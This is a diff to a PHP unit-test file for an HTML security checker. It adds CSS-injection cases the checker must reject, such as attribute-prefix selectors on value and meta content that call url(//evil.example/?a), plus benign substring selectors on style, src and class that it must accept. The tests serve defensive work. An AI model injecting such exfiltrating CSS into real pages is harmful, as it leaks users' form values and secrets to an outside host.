@@ -261,6 +261,13 @@ final class CssTest extends HtmlSecurityCheckTestCase
             'comment in prefix, contains' => ['[*/**/|value*="a"] { color: red }', '[*|value*='],
             'scan marker'            => ['[*/**/|data-mark^=a]{color:red}', '[*|data-mark^='],
             'no url at all'          => ['input[value^="a"] { color: red }', '[value^='],   // the rule is the selector, whatever follows it
+            'no element'             => ['[value*="abc"] { background: url(//evil.example/?abc) }', '[value*='],
+            'through :has()'         => ['form:has([value^="a"]) { background: url(//evil.example/?a) }', '[value^='],   // a hidden input shows no background, so the form does
+            'meta content'           => ['html:has(meta[content^="a"]) { background: url(//evil.example/?a) }', '[content^='],
+            'allowed name as prefix' => ['[styles^=a] { color: red }', '[styles^='],
+            'allowed name, longer'   => ['[srcset*=a] { color: red }', '[srcset*='],
+            'allowed name as suffix' => ['[data-src*=a] { color: red }', '[data-src*='],
+            'after an allowed name'  => ['[style^=a][value^=b] { color: red }', '[value^='],
             'unicode-range'          => ['@font-face { font-family: f; src: url(https://evil.example/f); unicode-range: U+65 }', 'unicode-range'],
             'unicode-range spaced'   => ['@font-face { unicode-range : U+65 }', 'unicode-range'],
         ];
@@ -282,6 +289,33 @@ final class CssTest extends HtmlSecurityCheckTestCase
             'presence'               => ['input[disabled] { opacity: .5 }'],
             'font-face without range' => ['@font-face { font-family: f; src: url(https://fonts.example/f.woff2) }'],
             'attribute selector then url' => ['input[type=text] { background: url(https://cdn.example/bg.png) }'],
+        ];
+    }
+
+    /**
+     * style, src and class hold layout, image addresses and class names, never a token, so substring
+     * selectors on them pass. Real content uses them: email templates and Wikipedia's own styles
+     */
+    #[DataProvider('allowedSubstringSelectorProvider')]
+    public function testSubstringSelectorsOnStyleSrcAndClassPass(string $css): void
+    {
+        $this->assertAccepts("<style>$css</style>");
+    }
+
+    public static function allowedSubstringSelectorProvider(): array
+    {
+        return [
+            'email template fix'     => ['div[style*="margin: 16px 0"] { margin: 0 !important }'],
+            'wikipedia logo'         => ['img[src*="Wiktionary-logo-v2.svg"] { border: 0 }'],
+            'wikipedia not style'    => ['.thumbimage:not([style*="background-color"]) { background: #fff }'],
+            'class prefix'           => ['a[class^="btn-"] { color: red }'],
+            'ends with'              => ['img[src$=".png"] { border: 0 }'],
+            'uppercase'              => ['[STYLE*="color"] { margin: 0 }'],
+            'spaces around'          => ['[ style *= "x" ] { margin: 0 }'],
+            'any namespace'          => ['[*|style^=x] { margin: 0 }'],
+            'no namespace'           => ['[|src$=x] { margin: 0 }'],
+            'named namespace'        => ['[ns|class*=x] { margin: 0 }'],
+            'with a remote url'      => ['img[src*="logo"] { background: url(https://upload.example/x.png) }'],
         ];
     }
 
